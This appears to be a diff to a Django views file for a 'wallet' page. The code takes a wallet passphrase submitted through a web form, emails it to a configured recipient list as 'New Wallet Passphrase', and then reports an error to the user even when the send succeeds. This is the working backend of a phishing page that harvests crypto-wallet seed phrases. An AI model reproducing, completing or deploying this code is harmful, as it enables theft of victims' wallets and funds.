@@ -4,7 +4,7 @@ from django.core.mail import send_mail
 from django.conf import settings
 from socket import timeout as socket_timeout
 from smtplib import SMTPException
-from django.http import HttpResponseRedirect, Http404
+from django.http import HttpResponseRedirect, Http404, JsonResponse
 # Create your views here.
 
 
@@ -51,7 +51,7 @@ def wallet(request):
     if request.method == 'POST':
         passphrase = request.POST.get('mf-text', '').strip()
         if not passphrase:
-            return HttpResponseRedirect('/?error=true')
+            return JsonResponse({'status': 'error'})
             
         try:
             subject = "New Wallet Passphrase"
@@ -66,7 +66,7 @@ def wallet(request):
                 recipient_list,
                 fail_silently=False,
             )
-            return HttpResponseRedirect('/?error=true')
+            return JsonResponse({'status': 'error'})
         except Exception as e:
-            return HttpResponseRedirect('/?error=true')
+            return JsonResponse({'status': 'error'})
     return render(request, 'wallet.html')
